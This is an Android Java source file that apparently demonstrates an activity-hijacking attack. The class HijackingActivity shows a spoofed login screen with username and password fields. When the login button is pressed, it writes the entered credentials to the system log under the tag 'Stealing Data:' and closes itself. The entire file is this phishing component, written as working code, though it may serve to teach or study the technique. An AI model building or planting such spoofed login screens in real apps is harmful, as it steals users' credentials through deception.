package com.example.ah.activityhijacking;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Button;
import android.widget.Toast;

public class HijackingActivity extends Activity implements View.OnClickListener {

    EditText mUID, mPWD;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_hijacking);
        mUID = (EditText) findViewById(R.id.username);
        mPWD = (EditText) findViewById(R.id.pwd);
        Button btn = (Button) findViewById(R.id.login);
        btn.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {
        Log.i("Stealing Data: ", mUID.getText().toString() + "," + mPWD.getText().toString());
        HijackingActivity.this.finish();
    }


}
